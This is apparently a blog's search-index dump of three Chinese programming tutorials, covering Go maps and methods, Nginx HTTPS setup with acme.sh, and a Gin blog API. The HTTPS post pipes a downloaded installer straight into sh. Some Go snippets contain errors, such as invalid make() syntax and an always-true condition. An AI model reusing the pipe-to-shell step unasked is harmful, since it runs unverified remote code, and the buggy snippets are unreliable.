class="language-go"><span class="token keyword">var</span> PersonInfoDB <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>PersonInfo</code></pre><p>PersonInfoDB为我们声明的map变量名，[string]则为键的类型，PersonInfo则为所以存放值得类型。  </p><h4 id="2-2-创建"><a href="#2-2-创建" class="headerlink" title="2.2 创建"></a>2.2 创建</h4><p> 创建map可以使用make函数。下面创建了一个键为string类型，值类型为PersonInfo的map。</p><pre class=" language-go"><code class="language-go">PersonInfoDB <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>PersonInfo<span class="token punctuation">)</span></code></pre><h5 id="我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。"><a href="#我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。" class="headerlink" title="我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。"></a>我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。</h5><pre><code>PersonInfoDB = make(map[string]PersonInfo,100)</code></pre><p> 还能创建直接储存值。  </p><pre class=" language-go"><code class="language-go">PersonInfoDB <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>PersonInfo<span class="token punctuation">{</span><span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"FUN"</span><span class="token punctuation">,</span> <span class="token string">"shanghai"</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="2-3赋值"><a href="#2-3赋值" class="headerlink" title="2.3赋值"></a>2.3赋值</h4><pre class=" language-go"><code class="language-go">    PersonInfoDB<span class="token punctuation">[</span><span class="token string">"1234"</span><span class="token punctuation">]</span> <span class="token operator">=</span> PersonInfo<span class="token punctuation">{</span><span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"FUN"</span><span class="token punctuation">,</span> <span class="token string">"shanghai"</span><span class="token punctuation">}</span></code></pre><h4 id="2-4元素删除"><a href="#2-4元素删除" class="headerlink" title="2.4元素删除"></a>2.4元素删除</h4><p>利用到delete函数</p><pre class=" language-go"><code class="language-go"><span class="token function">delete</span><span class="token punctuation">(</span>PersonInfoDB<span class="token punctuation">,</span><span class="token string">"1234"</span> <span class="token punctuation">)</span></code></pre><h4 id="2-5元素查找"><a href="#2-5元素查找" class="headerlink" title="2.5元素查找"></a>2.5元素查找</h4><pre class=" language-go"><code class="language-go">person<span class="token punctuation">,</span> ok <span class="token operator">:=</span> PersonInfoDB<span class="token punctuation">[</span><span class="token string">"1234"</span><span class="token punctuation">]</span><span class="token keyword">if</span> ok <span class="token punctuation">{</span>  处理数据<span class="token punctuation">}</span></code></pre><h2 id="3-0函数调用"><a href="#3-0函数调用" class="headerlink" title="3.0函数调用"></a>3.0函数调用</h2><h4 id="小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。"><a href="#小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。" class="headerlink" title="小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。"></a>小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。</h4><h2 id="4-0不定参数"><a href="#4-0不定参数" class="headerlink" title="4.0不定参数"></a>4.0不定参数</h2><h3 id="4-1-不定参数类型"><a href="#4-1-不定参数类型" class="headerlink" title="4.1 不定参数类型"></a>4.1 不定参数类型</h3><h4 id="不定参数类型主要以…type出现。"><a href="#不定参数类型主要以…type出现。" class="headerlink" title="不定参数类型主要以…type出现。"></a>不定参数类型主要以…type出现。</h4><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">myfunc</span><span class="token punctuation">(</span>argr <span class="token operator">...</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> agr <span class="token operator">:=</span> <span class="token keyword">range</span> argr <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>agr<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>当我们需要调用函数的时候myfunc(1,2,3).当我们不确定函数类型的时候可以使用…type。</p><h3 id="4-2任意类型的不定参数"><a href="#4-2任意类型的不定参数" class="headerlink" title="4.2任意类型的不定参数"></a>4.2任意类型的不定参数</h3><p>当想传递任意类型，可以指定类型为Interface{}</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">printf</span><span class="token punctuation">(</span>format <span class="token builtin">string</span><span class="token punctuation">,</span> args <span class="token operator">...</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">prinf</span><span class="token punctuation">(</span>args <span class="token operator">...</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> arg <span class="token operator">:=</span> <span class="token keyword">range</span> args <span class="token punctuation">{</span>        <span class="token keyword">switch</span> arg<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token builtin">int</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">"is int value."</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> <span class="token builtin">string</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">"is string value."</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> <span class="token builtin">float32</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">"is float32 value."</span><span class="token punctuation">)</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token string">"is unknow value."</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> v1 <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">var</span> v2 <span class="token builtin">int64</span> <span class="token operator">=</span> <span class="token number">234</span>    <span class="token keyword">var</span> v3 <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"hello"</span>    <span class="token keyword">var</span> v4 <span class="token builtin">float32</span> <span class="token operator">=</span> <span class="token number">1.234</span>    <span class="token function">prinf</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run <span class="token keyword">interface</span><span class="token punctuation">.</span><span class="token keyword">go</span><span class="token number">1</span> is <span class="token builtin">int</span> value<span class="token punctuation">.</span><span class="token number">234</span> is unknow value<span class="token punctuation">.</span>hello is <span class="token builtin">string</span> value<span class="token punctuation">.</span><span class="token number">1.234</span> is <span class="token builtin">float32</span> value<span class="token punctuation">.</span></code></pre><h2 id="5-0面向对象"><a href="#5-0面向对象" class="headerlink" title="5.0面向对象"></a>5.0面向对象</h2><p> 类型都是基于值传递的。要想修改变量的值，只能传递指针。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">type</span> Integer <span class="token builtin">int</span><span class="token keyword">func</span> <span class="token punctuation">(</span>a Integer<span class="token punctuation">)</span> <span class="token function">add</span><span class="token punctuation">(</span>b Integer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    a <span class="token operator">+=</span> b<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> a Integer <span class="token operator">=</span> <span class="token number">1</span>    a<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"a ="</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>$ go run add.goa = 1</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">type</span> Integer <span class="token builtin">int</span><span class="token keyword">func</span> <span class="token punctuation">(</span>a <span class="token operator">*</span>Integer<span class="token punctuation">)</span> <span class="token function">add</span><span class="token punctuation">(</span>b Integer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">*</span>a <span class="token operator">+=</span> b<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> a Integer <span class="token operator">=</span> <span class="token number">1</span>    a<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"a = "</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run add1<span class="token punctuation">.</span><span class="token keyword">go</span>a <span class="token operator">=</span>  <span class="token number">3</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx配置HTTPS</title>
      <link href="/2018/10/29/nginx-pei-zhi-https/"/>
      <url>/2018/10/29/nginx-pei-zhi-https/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx配置HTTPS"><a href="#Nginx配置HTTPS" class="headerlink" title="Nginx配置HTTPS"></a>Nginx配置HTTPS</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们站点搭建完协议都是走的HTTP1.1,不排除更低的1.0。<br><img src="http://image.kalifun.top/upload/1811/a739968397a59def.png" alt="http"><br>如果我们没有开启HTTPS你可以看到我们的站点会显示不安全。<br><img src="http://image.kalifun.top/upload/1811/aa4a33294093a978.png" alt="nginx"><br><img src="http://image.kalifun.top/upload/1811/1dd7aa404bb92778.png" alt="Security">  </p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><blockquote><p>HTTPS其实是有两部分组成：HTTP + SSL / TLS，也就是在HTTP上又加了一层处理加密信息的模块。今年出了TLS1.3了。其中还有TLS1.2，感觉更不上世界的步伐啊。</p></blockquote><h3 id="1-获取证书SSL"><a href="#1-获取证书SSL" class="headerlink" title="1.获取证书SSL"></a>1.获取证书SSL</h3><blockquote><p><strong>acme.sh</strong>实现了<code>acme</code>协议, 可以从Let’s Encrypt 生成免费的证书.</p></blockquote><h4 id="1-1-安装acme-sh"><a href="#1-1-安装acme-sh" class="headerlink" title="1.1 安装acme.sh"></a>1.1 安装acme.sh</h4><pre class=" language-bash"><code class="language-bash">curl https://get.acme.sh <span class="token operator">|</span> sh</code></pre><p> 脚本将会自动执行，当你看到Install success!说明你安装成功。安装成功请把你的服务器的终端关闭。不然你输入相关命令是不生效的哦。  </p><h4 id="1-2生成证书"><a href="#1-2生成证书" class="headerlink" title="1.2生成证书"></a>1.2生成证书</h4><p><strong>acme.sh</strong>实现了<strong>acme</strong>协议支持的所有验证协议. 一般有两种方式验证: http 和 dns 验证.<br> 这里就提及http验证，如果感兴趣你可以去官网查相关资料。<br>http 方式需要在你的网站根目录下放置一个文件, 来验证你的域名所有权,完成验证. 然后就可以生成证书了.</p><pre class=" language-bash"><code class="language-bash">    acme.sh  --issue  -d mydomain.com -d www.mydomain.com  --webroot  /home/wwwroot/mydomain.com/</code></pre><p>如果你用的<strong>apache</strong>服务器,<strong>acme.sh</strong>还可以智能的从<strong>apache</strong>的配置中自动完成验证, 你不需要指定网站根目录:</p><pre><code>    acme.sh --issue  -d mydomain.com   --apache</code></pre><p>如果你用的<strong>nginx</strong>服务器, 或者反代,<strong>acme.sh</strong>还可以智能的从<strong>nginx</strong>的配置中自动完成验证, 你不需要指定网站根目录:</p><pre><code>    acme.sh --issue  -d mydomain.com   --nginx</code></pre><h4 id="1-3-copy-安装-证书"><a href="#1-3-copy-安装-证书" class="headerlink" title="1.3 copy/安装 证书"></a>1.3 copy/安装 证书</h4><pre class=" language-sh"><code class="language-sh">        acme.sh  --installcert  -d  <domain>.com   \            --key-file   /etc/nginx/ssl/<domain>.key \            --fullchain-file /etc/nginx/ssl/fullchain.cer \            --reloadcmd  " nginx -s reload"</code></pre><p> 修正一下，请使用nginx -s reload.如果安装官方会报没有这个命令，除非你去init.d/nginx进行修改才可以。  </p><h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p>  http默认是监听80端口，而https监听的是443端口。</p><blockquote><p>domain.com.conf</p><pre class=" language-nginx"><code class="language-nginx">  <span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">443</span> <span class="token keyword">ssl</span> http2<span class="token punctuation">;</span>    <span class="token keyword">server_name</span> domain<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm default<span class="token punctuation">.</span>html default<span class="token punctuation">.</span>htm default<span class="token punctuation">.</span>php<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$host</span> <span class="token operator">!=</span> domain<span class="token punctuation">.</span>com<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">301</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>domain<span class="token punctuation">.</span>com<span class="token variable">$request_uri</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">root</span>  <span class="token operator">/</span>home<span class="token operator">/</span>www<span class="token operator">/</span>domain<span class="token punctuation">;</span></code></pre></blockquote><pre><code>ssl_certificate     /etc/nginx/ssl/fullchain.cer;ssl_certificate_key   /etc/nginx/ssl/domain.top.key;ssl_protocols TLSv1.2;ssl_ciphers &#39;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256&#39;;ssl_prefer_server_ciphers on;ssl_session_cache shared:SSL:50m;ssl_session_timeout 1d;ssl_session_tickets on;ssl_stapling on;ssl_stapling_verify on;resolver 119.29.29.29 8.8.8.8 valid=300s;resolver_timeout 10s;add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;;location ~ .*\.(php|php5)?${fastcgi_pass  unix:/tmp/php-cgi.sock;fastcgi_index index.php;include fastcgi.conf;}location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|ico)$ {  expires 30d;}location ~ .*\.(js|css)?$ {  expires 15d;}</code></pre><p>}</p><pre><code>如果你的也是WordPress站点，那你等等吧。你网站绝对无法正常开启https。你会发现还是会报（你的连接不完全安全）。 点击F12，查看Console。它的意思是你的网站已经是https了，但是有些连接还是http地址。好不容易搞定，我又要跑去后台，把以前是http的地址改成https。还有一种偷懒的方法，那就是去数据库进行update。找到你站点的数据库，来到wp_postsde表。执行sql语句。  ``` mysql  1.  update wp_posts set post_content = replace(post_content,&#39;http://&#39;,&#39;https://&#39;);</code></pre><p>当你改完之后你刷新页面就可以看到效果了。<br>  <img src="https://image.kalifun.top/upload/1811/fa267fcc3336370a.png" alt="https"><br> 看到这个是不是舒畅了，总比之前报红好。<br>  <img src="https://image.kalifun.top/upload/1811/2c5d5dcd80ffbf5f.png" alt="sll"><br>最好推荐一个ssl的跑分网站<a href="https://www.ssllabs.com/ssltest/index.html" target="_blank" rel="noopener">SSL Server Test</a><br>  <img src="https://image.kalifun.top/upload/1811/2b95e408e7fa59e1.png" alt="SSL Server Test"></p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin搭建Blog API‘s （二）</title>
      <link href="/2018/10/26/gin-da-jian-blog-api-s-er/"/>
      <url>/2018/10/26/gin-da-jian-blog-api-s-er/</url>
      
        <content type="html"><![CDATA[<h1 id="Gin搭建Blog-API‘s-（二）"><a href="#Gin搭建Blog-API‘s-（二）" class="headerlink" title="Gin搭建Blog API‘s （二）"></a>Gin搭建Blog API‘s （二）</h1><h2 id="按照Gin搭建Blog-API’s-一-教程来的。此为原作者。"><a href="#按照Gin搭建Blog-API’s-一-教程来的。此为原作者。" class="headerlink" title="按照Gin搭建Blog API’s (一)教程来的。此为原作者。"></a>按照<a href="https://github.com/EDDYCJY/blog/blob/master/golang/gin/2018-02-16-Gin%E5%AE%9E%E8%B7%B5-%E8%BF%9E%E8%BD%BD%E4%B8%89-%E6%90%AD%E5%BB%BABlogAPIs-02.md" target="_blank" rel="noopener">Gin搭建Blog API’s (一)</a>教程来的。此为原作者。</h2><h2 id="定义接口"><a href="#定义接口" class="headerlink" title="定义接口"></a>定义接口</h2><ul><li>获取标签列表：GET(“/tags”)</li><li>新建标签：POST(“/tags”)</li><li>更新指定标签：PUT(“/tags/:id”)</li><li>删除指定标签：DELETE(“/tags/:id”)</li></ul><h2 id="编写路由空壳"><a href="#编写路由空壳" class="headerlink" title="编写路由空壳"></a>编写路由空壳</h2><p>在routers下创建api目录，我们当前第一个版本，因此在api下新建v1目录，再创建tag.go。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> v1<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">GetTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取tags</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">AddTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 新增tags</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">EditTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 更新tags</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">DeleteTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 删除tags</span><span class="token punctuation">}</span></code></pre><h2 id="注册路由"><a href="#注册路由" class="headerlink" title="注册路由"></a>注册路由</h2><p>修改router.go</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> routers<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"gin-blog/pkg/setting"</span>    <span class="token string">"github.com/gin-gonic/gin"</span>    <span class="token string">"gin-blog/routers/api/v1"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">InitRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span>gin<span class="token punctuation">.</span>Engine <span class="token punctuation">{</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>gin<span class="token punctuation">.</span><span class="token function">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>gin<span class="token punctuation">.</span><span class="token function">Recovery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    gin<span class="token punctuation">.</span><span class="token function">SetMode</span><span class="token punctuation">(</span>setting<span class="token punctuation">.</span>RunModel<span class="token punctuation">)</span>    apiv1 <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/api/v1"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        apiv1<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/tags"</span><span class="token punctuation">,</span>v1<span class="token punctuation">.</span>GetTags<span class="token punctuation">)</span>        apiv1<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/tags"</span><span class="token punctuation">,</span>v1<span class="token punctuation">.</span>AddTags<span class="token punctuation">)</span>        apiv1<span class="token punctuation">.</span><span class="token function">PUT</span><span class="token punctuation">(</span><span class="token string">"/tags/:id"</span><span class="token punctuation">,</span>v1<span class="token punctuation">.</span>EditTags<span class="token punctuation">)</span>        apiv1<span class="token punctuation">.</span><span class="token function">DELETE</span><span class="token punctuation">(</span><span class="token string">"/tags/:id"</span><span class="token punctuation">,</span>v1<span class="token punctuation">.</span>DeleteTags<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// r.GET("/test",func(c *gin.Context){</span>    <span class="token comment" spellcheck="true">//     c.JSON(200,gin.H{</span>    <span class="token comment" spellcheck="true">//         "message":"ok",</span>    <span class="token comment" spellcheck="true">//     })</span>    <span class="token comment" spellcheck="true">// })</span>    <span class="token keyword">return</span> r<span class="token punctuation">}</span></code></pre><p>当出现下面这样，说明我们设计的路由规则通过了。<br><a href="https://postimg.cc/0bBHm7Xz" target="_blank" rel="noopener"><img src="https://i.postimg.cc/DwvV9gqP/answer.png" alt="answer.png"></a></p><h4 id="目前的目录树是："><a href="#目前的目录树是：" class="headerlink" title="目前的目录树是："></a>目前的目录树是：</h4><pre class=" language-go"><code class="language-go">│  main<span class="token punctuation">.</span><span class="token keyword">go</span>│  test<span class="token punctuation">.</span><span class="token keyword">go</span>│├─conf│      app<span class="token punctuation">.</span>ini│├─middleware├─models│      models<span class="token punctuation">.</span><span class="token keyword">go</span>│├─pkg│  ├─e│  │      code<span class="token punctuation">.</span><span class="token keyword">go</span>│  │      msg<span class="token punctuation">.</span><span class="token keyword">go</span>│  ││  ├─setting│  │      setting<span class="token punctuation">.</span><span class="token keyword">go</span>│  ││  └─util│          pagination<span class="token punctuation">.</span><span class="token keyword">go</span>│├─routers│  │  router<span class="token punctuation">.</span><span class="token keyword">go</span>│  ││  └─api│      └─v1│              tag<span class="token punctuation">.</span><span class="token keyword">go</span>│└─runtime</code></pre><h2 id="编写标签列表models逻辑"><a href="#编写标签列表models逻辑" class="headerlink" title="编写标签列表models逻辑"></a>编写标签列表models逻辑</h2><p>下载依赖包<a href="https://beego.me/docs/mvc/controller/validation.md" target="_blank" rel="noopener">validation</a>。用于数据验证和错误收集的模块。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get github<span class="token punctuation">.</span>com<span class="token operator">/</span>astaxie<span class="token operator">/</span>beego<span class="token operator">/</span>validation</code></pre><p> 在models目录下创建tag.go</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> models<span class="token keyword">type</span> Tag <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Model    Name <span class="token builtin">string</span> <span class="token string">`json:"name"`</span>    CreatedBy <span class="token builtin">string</span> <span class="token string">`json:"created_by"`</span>    ModifiedBy <span class="token builtin">string</span> <span class="token string">`json:"modified_by"`</span>    State <span class="token builtin">int</span> <span class="token string">`json:"state"`</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">GetTags</span><span class="token punctuation">(</span>pageNum <span class="token builtin">int</span><span class="token punctuation">,</span> pageSize <span class="token builtin">int</span><span class="token punctuation">,</span> maps <span class="token keyword">interface</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>tags <span class="token punctuation">[</span><span class="token punctuation">]</span>Tag<span class="token punctuation">)</span> <span class="token punctuation">{</span>    db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Offset</span><span class="token punctuation">(</span>pageNum<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Limit</span><span class="token punctuation">(</span>pageSize<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tags<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">GetTotal</span><span class="token punctuation">(</span>maps <span class="token keyword">interface</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>count <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    db<span class="token punctuation">.</span><span class="token function">Model</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Tag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Count</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">}</span></code></pre><ul><li>创建struct{}，提供给gorm使用。并给予了附属属性json，在c.json的时候会自动转换格式。</li><li>可能会有的初学者看到return，而后面没有跟着变量，会不理解；其实你可以看到在函数末端，我们已经显示声明了返回值，这个变量在函数体内也可以直接使用，因为他在一开始就被声明了</li><li>有人会疑惑db是哪里来的；因为在同个models包下，因此db *gorm.DB是可以直接使用的</li></ul><h2 id="编写标签列表的路由逻辑"><a href="#编写标签列表的路由逻辑" class="headerlink" title="编写标签列表的路由逻辑"></a>编写标签列表的路由逻辑</h2><p>编写获得标签列表的接口，修改routers/api/v1/tag.go</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> v1<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"net/http"</span>    <span class="token string">"gin-blog/pkg/e"</span>    <span class="token string">"gin-blog/pkg/util"</span>    <span class="token string">"gin-blog/models"</span>    <span class="token string">"gin-blog/pkg/setting"</span>    <span class="token string">"github.com/Unknwon/com"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">GetTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取tags</span>    name <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    maps <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"name"</span> <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>        maps<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> name    <span class="token punctuation">}</span>    <span class="token keyword">var</span> state <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> arg <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"state"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>arg <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>        state <span class="token operator">=</span> com<span class="token punctuation">.</span><span class="token 